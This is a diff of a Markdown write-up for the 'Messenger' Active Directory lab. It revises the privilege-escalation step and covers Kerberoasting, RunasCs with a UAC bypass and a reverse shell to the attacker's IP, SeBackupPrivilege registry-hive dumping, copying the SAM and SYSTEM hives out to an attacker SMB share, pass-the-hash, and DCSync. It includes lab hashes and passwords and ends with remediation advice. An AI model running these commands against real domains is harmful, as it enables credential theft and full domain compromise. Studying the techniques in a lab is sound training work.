@@ -1,7 +1,7 @@
 ---
 title: "Messenger 💬"
 date: 2026-11-20
-summary: "A medium-difficulty Active Directory lab where a Kerberoasted service account's GenericWrite and AddSelf over a group open a file share holding a reused password, Backup Operators rights on the file server give up a local hash shared with a domain account, and an Output Messenger chat reached through a Ligolo-ng tunnel hands over credentials whose WriteDacl over the domain grants DCSync."
+summary: "A medium-difficulty Active Directory lab where a Kerberoasted service account's GenericWrite and AddSelf over a group open a file share holding a reused password, the same account's SeBackupPrivilege on the file server gives up a local hash shared with a domain account, and an Output Messenger chat reached through a Ligolo-ng tunnel hands over credentials whose WriteDacl over the domain grants DCSync."
 platforms: ["Hack Smarter Labs"]
 tags: ["Active Directory"]
 difficulty: "Medium"
@@ -11,7 +11,7 @@ cover:
   hidden: true
 ---
 
-In this walkthrough, we will be compromising Messenger, a medium-difficulty Active Directory lab from Hack Smarter Labs, starting from assumed-breach credentials for `kyoma` against three hosts: the domain controller DC01, a file server, FILESRV01, and a messaging server, MSGSRV01. `kyoma` can Kerberoast `svc_backup`, whose cracked password, plus `GenericWrite` and `AddSelf` over the `File Management` group, opens two shares on FILESRV01, and a notebook config in one of them holds a password that also works for `nae`. From a WinRM shell as `nae` on FILESRV01, RunasCs gives us a shell as `svc_backup`, a member of that host's local Backup Operators group, and backing up the registry hives over the network gives up its local SAM. A local `moeka` account in it shares its password with the domain account `moeka`, which opens a WinRM shell on MSGSRV01. A spreadsheet there holds `moeka`'s Output Messenger login, and a Ligolo-ng tunnel reaches the chat server's web client, where a help desk message carries `braun`'s password. `braun` holds `WriteDacl` over the domain, so we grant it DCSync rights, dump every hash from DC01, and log in as the domain Administrator.
+In this walkthrough, we will be compromising Messenger, a medium-difficulty Active Directory lab from Hack Smarter Labs, starting from assumed-breach credentials for `kyoma` against three hosts: the domain controller DC01, a file server, FILESRV01, and a messaging server, MSGSRV01. `kyoma` can Kerberoast `svc_backup`, whose cracked password, plus `GenericWrite` and `AddSelf` over the `File Management` group, opens two shares on FILESRV01, and a notebook config in one of them holds a password that also works for `nae`. From a WinRM shell as `nae` on FILESRV01, RunasCs with a NetworkCleartext logon gives us a shell as `svc_backup` whose token carries SeBackupPrivilege, and switching it on lets us save the host's SAM. A local `moeka` account in it shares its password with the domain account `moeka`, which opens a WinRM shell on MSGSRV01. A spreadsheet there holds `moeka`'s Output Messenger login, and a Ligolo-ng tunnel reaches the chat server's web client, where a help desk message carries `braun`'s password. `braun` holds `WriteDacl` over the domain, so we grant it DCSync rights, dump every hash from DC01, and log in as the domain Administrator.
 
 ![Messenger machine card](images/machine-card.png)
 
@@ -622,7 +622,29 @@ Over WinRM, NetExec's `(Pwn3d!)` means the account can open a remote shell, and 
 evil-winrm -i '10.1.207.33' -u 'nae' -p 'ChipmunKid314'
 ```
 
-We work through the usual host enumeration on FILESRV01 as `nae`, and none of it turns up a way to escalate from `nae` itself.
+We work through the usual host enumeration on FILESRV01 as `nae`. None of it turns up a way to escalate from `nae` itself, but listing `C:\Users` shows who else has used the host.
+
+```
+dir
+```
+
+```
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         10/8/2026   8:31 AM                Administrator
+d-----         10/7/2026   8:16 AM                nae
+d-r---         5/21/2026   9:15 AM                Public
+d-----         10/7/2026   8:14 AM                svc_backup
+```
+
+![FILESRV01 user profiles](images/users-folder-filesrv01.png)
+
+*C:\Users on FILESRV01 in the nae session, with a profile folder for svc_backup*
+
+`svc_backup` has a profile folder here, so the account has logged on to FILESRV01 before.
 
 ## Shell as svc_backup
 
@@ -633,7 +655,7 @@ upload Invoke-RunasCs.ps1
 ```
 
 ```
-Info: Uploading /home/kali/Desktop/ctf/hack_smarter_labs/active_directory/medium/messenger/Invoke-RunasCs.ps1 to C:\Users\nae\Documents\Invoke-RunasCs.ps1
+Info: Uploading /home/kali/Desktop/ctf/hack_smarter_labs/active_directory/medium/messenger/Invoke-RunasCs.ps1 to C:\Users\Nae\Desktop\Invoke-RunasCs.ps1
                                         
 Info: Upload successful!
 ```
@@ -650,23 +672,23 @@ We start Penelope, a reverse shell handler, and leave it listening on our port.
 penelope -p 1337
 ```
 
-We give RunasCs the `svc_backup` credentials and `cmd.exe` to launch, so the shell that calls back is running as that account. RunasCs uses an interactive logon by default.
+We give RunasCs the `svc_backup` credentials and `cmd.exe` to launch, so the shell that calls back is running as that account. RunasCs uses an interactive logon by default, and UAC filters the token of an interactive logon for an account with elevated rights. Type 8, NetworkCleartext, is a network logon where the program hands Windows the plaintext password, and UAC leaves a domain account's network logon unfiltered. `-LogonType 8` asks for it, and `-BypassUac` is what lets RunasCs start the shell under it from this session instead of falling back to an interactive logon.
 
 ```
-Invoke-RunasCs -Username svc_backup -Password 'ibm.2000' -Domain sern.local -Command "cmd.exe" -Remote 10.200.121.154:1337
+Invoke-RunasCs -Username svc_backup -Password 'ibm.2000' -Domain sern.local -Command "cmd.exe" -Remote 10.200.121.154:1337 -BypassUac -LogonType 8
 ```
 
 Update the IP and port to your own.
 
 ```
 [+] Running in session 0 with process function CreateProcessWithLogonW()
-[+] Using Station\Desktop: Service-0x0-131dfd$\Default
-[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1120 created in background.
+[+] Using Station\Desktop: Service-0x0-4e737d$\Default
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 3784 created in background.
 ```
 
 ![RunasCs as svc_backup](images/runascs-svc-backup.png)
 
-*Invoke-RunasCs in the nae session on FILESRV01, starting cmd.exe as svc_backup with a reverse shell to our host*
+*Invoke-RunasCs in the nae session on FILESRV01 with -BypassUac and -LogonType 8, starting cmd.exe as svc_backup with a reverse shell to our host*
 
 Penelope catches the shell.
 
@@ -682,127 +704,151 @@ sern\svc_backup
 
 *Penelope receiving the RunasCs reverse shell running as sern\svc_backup*
 
-We look at the account's groups and privileges.
+We check its privileges.
 
 ```
-whoami /all
+whoami /priv
 ```
 
 ```
-USER INFORMATION
-----------------
-
-User Name       SID                                         
-=============== ============================================
-sern\svc_backup S-1-5-21-2387301235-874641830-263055908-1109
-
-GROUP INFORMATION
------------------
-
-Group Name                                 Type             SID                                          Attributes                                        
-========================================== ================ ============================================ ==================================================
-Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                 Group used for deny only                          
-BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
-CONSOLE LOGON                              Well-known group S-1-2-1                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
-SERN\File Management                       Group            S-1-5-21-2387301235-874641830-263055908-1110 Mandatory group, Enabled by default, Enabled group
-Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                    
-
 PRIVILEGES INFORMATION
 ----------------------
 
 Privilege Name                Description                    State   
 ============================= ============================== ========
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Enabled 
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
-SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
-
-USER CLAIMS INFORMATION
------------------------
-
-User claims unknown.
-
-Kerberos support for Dynamic Access Control on this device has been disabled.
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 
 ```
 
-![svc_backup groups and privileges](images/whoami-backup-operators.png)
+![svc_backup privileges](images/whoami-priv-svc-backup.png)
 
-*whoami /all in the svc_backup shell on FILESRV01, with Backup Operators listed as deny only and no SeBackupPrivilege*
+*whoami /priv in the svc_backup shell on FILESRV01, with SeBackupPrivilege and SeRestorePrivilege present but disabled*
 
-`svc_backup` is in `BUILTIN\Backup Operators`, which on a member server is the host's own local group, so these are backup rights on FILESRV01 rather than on DC01. Backup Operators can connect to a host's administrative shares, which accounts for `svc_backup`'s `ADMIN$` and `C$` access. Backup Operators holds SeBackupPrivilege, which lets a member read any file on the host regardless of its DACL, including the registry hives that hold local credentials, so we try saving the SAM.
+The token holds SeBackupPrivilege and SeRestorePrivilege, both disabled. SeBackupPrivilege lets an account read any file on the host regardless of its DACL, including the registry hives that hold local credentials, so we switch it on and save the hives.
+
+[EnableAllTokenPrivs](https://github.com/fashionproof/EnableAllTokenPrivs) is a PowerShell script that switches on every privilege its PowerShell process already holds. We download it on our host.
 
 ```
-reg save HKLM\SAM C:\Windows\Temp\sam.save
+wget https://github.com/fashionproof/EnableAllTokenPrivs/raw/master/EnableAllTokenPrivs.ps1
 ```
 
 ```
-File C:\Windows\Temp\sam.save already exists. Overwrite (Yes/No)?yes
-ERROR: A required privilege is not held by the client.
+--2026-11-21 20:15:57--  https://github.com/fashionproof/EnableAllTokenPrivs/raw/master/EnableAllTokenPrivs.ps1
+Resolving github.com (github.com)... 140.82.112.4
+Connecting to github.com (github.com)|140.82.112.4|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1 [following]
+--2026-11-21 20:15:57--  https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3449 (3.4K) [text/plain]
+Saving to: ‘EnableAllTokenPrivs.ps1’
+
+EnableAllTokenPrivs.ps1                                         100%[====================================================================================================================================================>]   3.37K  --.-KB/s    in 0s      
+
+2026-11-21 20:15:58 (80.3 MB/s) - ‘EnableAllTokenPrivs.ps1’ saved [3449/3449]
 ```
 
-![reg save failing](images/reg-save-failed.png)
+We upload it through the `nae` Evil-WinRM session to `C:\ProgramData`, which every user on the host can read by default, so the `svc_backup` shell can run it. The path goes in single quotes so Evil-WinRM keeps its backslashes.
 
-*reg save in the svc_backup shell on FILESRV01, refused because the privilege is not held*
+```
+upload EnableAllTokenPrivs.ps1 'C:\ProgramData\EnableAllTokenPrivs.ps1'
+```
 
-The `whoami /all` output explains the failure: Backup Operators is marked `Group used for deny only`, and SeBackupPrivilege is not in the token. UAC filters the token of an interactive logon by a member of Backup Operators, and RunasCs logs on interactively by default, so the shell runs at medium integrity without the privilege.
+![Script uploaded to FILESRV01](images/upload-enablealltokenprivs.png)
+
+*Evil-WinRM in the nae session uploading EnableAllTokenPrivs.ps1 to C:\ProgramData on FILESRV01*
+
+The shell is `cmd.exe`, so we start PowerShell in it.
+
+```
+powershell
+```
+
+We run the script, which returns silently.
+
+```
+C:\ProgramData\EnableAllTokenPrivs.ps1
+```
+
+Then we check the privileges again.
+
+```
+whoami /priv
+```
+
+```
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State  
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+![Privileges switched on](images/privs-enabled.png)
+
+*whoami /priv in the svc_backup PowerShell session after EnableAllTokenPrivs, with SeBackupPrivilege and SeRestorePrivilege enabled*
+
+Both now show as enabled. From the same PowerShell session, we try to save all three hives as standard practice. The local account hashes sit in `SAM`, encrypted with a key derived from the boot key in `SYSTEM`, and `SECURITY` holds the LSA secrets and cached domain logons.
+
+```
+reg save HKLM\SAM C:\ProgramData\sam.save
+reg save HKLM\SYSTEM C:\ProgramData\system.save
+reg save HKLM\SECURITY C:\ProgramData\security.save
+```
+
+```
+The operation completed successfully.
+The operation completed successfully.
+ERROR: Access is denied.
+```
+
+![Hives saved with reg save](images/reg-save-hives.png)
+
+*reg save in the svc_backup shell saving the SAM and SYSTEM hives, with SECURITY refused*
+
+`reg save` refuses `SECURITY` with `Access is denied`, but `SAM` and `SYSTEM` are enough. We serve an SMB share from our host and copy both hives to it from the same `svc_backup` session. The share takes a username and password, because FILESRV01 refuses to connect to one as a guest.
+
+```
+impacket-smbserver share ./ -smb2support -username 0xB1rd -password 0xB1rd
+```
+
+In the `svc_backup` session, we connect to the share with those credentials.
+
+```
+net use \\10.200.121.154\share /user:0xB1rd 0xB1rd
+```
+
+```
+The command completed successfully.
+```
+
+Then we copy both hives, and `copy` prints nothing when it works.
+
+```
+copy C:\ProgramData\sam.save \\10.200.121.154\share\
+copy C:\ProgramData\system.save \\10.200.121.154\share\
+```
 
 ## Access as moeka
 
-Over the network, UAC filters only local accounts, so a domain account like `svc_backup` authenticating over SMB carries its full Backup Operators token. impacket-reg can back up the `SAM`, `SYSTEM`, and `SECURITY` hives through the remote registry and write them to a share, so we start one on our host.
+With the hives on our host, impacket-secretsdump parses them locally.
 
 ```
-impacket-smbserver share ./ -smb2support
-```
-
-Then we run the backup against FILESRV01 as `svc_backup`.
-
-```
-impacket-reg 'sern.local/svc_backup:ibm.2000@10.1.207.33' backup -o '\\10.200.121.154\share'
+impacket-secretsdump -sam sam.save -system system.save LOCAL
 ```
 
 ```
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
-[*] Saved HKLM\SAM to \\10.200.121.154\share\SAM.save
-[-] Couldn't save HKLM\SYSTEM: The NETBIOS connection with the remote host timed out.
-[-] Error occurs while reading from remote(104)
-```
-
-impacket-reg saves `SAM`, then reports a timeout on `SYSTEM` and stops before it reaches `SECURITY`. We check what landed in the share.
-
-```
-ls -lh
-```
-
-```
-total 19M
--rw------- 1 kali kali 4.9K Nov 19 17:45 challenge_lab_messen.ovpn
--rw-rw-r-- 1 kali kali 143K Nov 19 19:21 DC01_10.1.33.51_2026-11-19_191902_bloodhound.zip
-drwxrwxr-x 2 kali kali 4.0K Nov 19 19:52 dev
--rw-rw-r-- 1 kali kali   35 Nov 19 19:16 hosts.txt
--rw-rw-r-- 1 kali kali  87K Nov 19 20:01 Invoke-RunasCs.ps1
--rwxrwxr-x 1 kali kali  44K Nov 20 20:28 SAM.save
--rw-rw-r-- 1 kali kali 2.1K Nov 19 19:39 svc_backup_kerb.txt
--rwxrwxr-x 1 kali kali  19M Nov 20 20:34 SYSTEM.save
--rw-rw-r-- 1 kali kali   16 Nov 19 19:48 users.txt
-```
-
-![Hives in the share](images/hives-landed.png)
-
-*SAM.save and SYSTEM.save in our SMB share after the impacket-reg backup, with no SECURITY.save*
-
-`SAM.save` is there, and so is a 19M `SYSTEM.save`, written six minutes after it. `SECURITY.save` is missing, but we do not need it: `SECURITY` holds the LSA secrets and cached domain logons, while the local account hashes sit in `SAM`, encrypted with a key derived from the boot key in `SYSTEM`. impacket-secretsdump parses the two hives locally.
-
-```
-impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
-```
-
-```
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Target system bootKey: 0x9f6f3c854f7b832790ebd8675aa969ca
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
@@ -811,33 +857,24 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:f08bb0f2a18087aebde05a88e8562905:::
 moeka:1000:aad3b435b51404eeaad3b435b51404ee:3db7b1172736f9269dc00118e536a07b:::
-[*] Cleaning up... 
+[*] Cleaning up...
 ```
 
 ![FILESRV01 hives parsed](images/secretsdump-local.png)
 
 *impacket-secretsdump parsing the FILESRV01 hives, with the local moeka hash in the SAM*
 
-secretsdump reads the boot key out of `SYSTEM.save`, so the copy that landed despite the timeout is usable. Alongside the built-in accounts, FILESRV01's SAM holds a local account named `moeka`, RID (relative identifier) 1000. john does not crack its hash, but `moeka` is also a domain account from the `--users` output, so we test the local hash against the domain.
+Alongside the built-in accounts, FILESRV01's SAM holds a local account named `moeka`, RID (relative identifier) 1000. john does not crack its hash, but `moeka` is also a domain account from the `--users` output, so we test the local hash against the domain.
 
 ```
 nxc smb hosts.txt -u 'moeka' -H '3db7b1172736f9269dc00118e536a07b' --shares
 ```
 
 ```
+SMB         10.1.207.33     445    FILESRV01        [*] Windows Server 2022 Build 20348 x64 (name:FILESRV01) (domain:sern.local) (signing:True) (SMBv1:None)
 SMB         10.1.33.51      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:sern.local) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.1.207.33     445    FILESRV01        [*] Windows Server 2022 Build 20348 x64 (name:FILESRV01) (domain:sern.local) (signing:False) (SMBv1:None)
-SMB         10.1.33.51      445    DC01             [+] sern.local\moeka:3db7b1172736f9269dc00118e536a07b 
 SMB         10.1.207.33     445    FILESRV01        [+] sern.local\moeka:3db7b1172736f9269dc00118e536a07b 
-SMB         10.1.33.51      445    DC01             [*] Enumerated shares
-SMB         10.1.33.51      445    DC01             Share           Permissions     Remark
-SMB         10.1.33.51      445    DC01             -----           -----------     ------
-SMB         10.1.33.51      445    DC01             ADMIN$                          Remote Admin
-SMB         10.1.33.51      445    DC01             C$                              Default share
-SMB         10.1.33.51      445    DC01             IPC$            READ            Remote IPC
-SMB         10.1.33.51      445    DC01             NETLOGON        READ            Logon server share 
-SMB         10.1.33.51      445    DC01             SYSVOL          READ            Logon server share 
-SMB         10.1.150.10     445    MSGSRV01         [*] Windows Server 2022 Build 20348 (name:MSGSRV01) (domain:sern.local) (signing:False) (SMBv1:None)
+SMB         10.1.33.51      445    DC01             [+] sern.local\moeka:3db7b1172736f9269dc00118e536a07b 
 SMB         10.1.207.33     445    FILESRV01        [*] Enumerated shares
 SMB         10.1.207.33     445    FILESRV01        Share           Permissions     Remark
 SMB         10.1.207.33     445    FILESRV01        -----           -----------     ------
@@ -846,6 +883,15 @@ SMB         10.1.207.33     445    FILESRV01        C$                          
 SMB         10.1.207.33     445    FILESRV01        DEV                             
 SMB         10.1.207.33     445    FILESRV01        HR                              
 SMB         10.1.207.33     445    FILESRV01        IPC$            READ            Remote IPC
+SMB         10.1.150.10     445    MSGSRV01         [*] Windows Server 2022 Build 20348 (name:MSGSRV01) (domain:sern.local) (signing:True) (SMBv1:None)
+SMB         10.1.33.51      445    DC01             [*] Enumerated shares
+SMB         10.1.33.51      445    DC01             Share           Permissions     Remark
+SMB         10.1.33.51      445    DC01             -----           -----------     ------
+SMB         10.1.33.51      445    DC01             ADMIN$                          Remote Admin
+SMB         10.1.33.51      445    DC01             C$                              Default share
+SMB         10.1.33.51      445    DC01             IPC$            READ            Remote IPC
+SMB         10.1.33.51      445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.1.33.51      445    DC01             SYSVOL          READ            Logon server share 
 SMB         10.1.150.10     445    MSGSRV01         [+] sern.local\moeka:3db7b1172736f9269dc00118e536a07b 
 SMB         10.1.150.10     445    MSGSRV01         [*] Enumerated shares
 SMB         10.1.150.10     445    MSGSRV01         Share           Permissions     Remark
@@ -1227,8 +1273,8 @@ We have a shell on DC01 as the domain Administrator. `root.txt` is on the Admini
 
 ## Final Thoughts
 
-The hive backup took a second attempt. When `reg save` failed in the RunasCs shell, I backed the hives up over the network instead.
+SeBackupPrivilege was in `svc_backup`'s token from the start, just switched off, and I could only save the hives once I turned it on with EnableAllTokenPrivs.
 
-Service accounts with SPNs belong on gMSA or a PAM-managed password, so a roasted ticket produces nothing crackable. A password typed on a command line or saved in a script belongs in a credential prompt or a vault. Backup Operators on a server can read its SAM and LSA secrets, so a service account has no place in it, and a local account's password should never double as a domain password. Credentials belong in a password manager, not a spreadsheet or a chat history. `svc_backup` held `GenericWrite` and `AddSelf` over File Management and `braun` held `WriteDacl` over the domain, and object-level rights like these need auditing on a schedule rather than at build time.
+Service accounts with SPNs belong on gMSA or a PAM-managed password, so a roasted ticket produces nothing crackable. A password typed on a command line or saved in a script belongs in a credential prompt or a vault. SeBackupPrivilege on a server can read its SAM, so it does not belong on a service account, and a local account's password should never double as a domain password. Credentials belong in a password manager, not a spreadsheet or a chat history. `svc_backup` held `GenericWrite` and `AddSelf` over File Management and `braun` held `WriteDacl` over the domain, and object-level rights like these need auditing on a schedule rather than at build time.
 
 — 0xB1rd
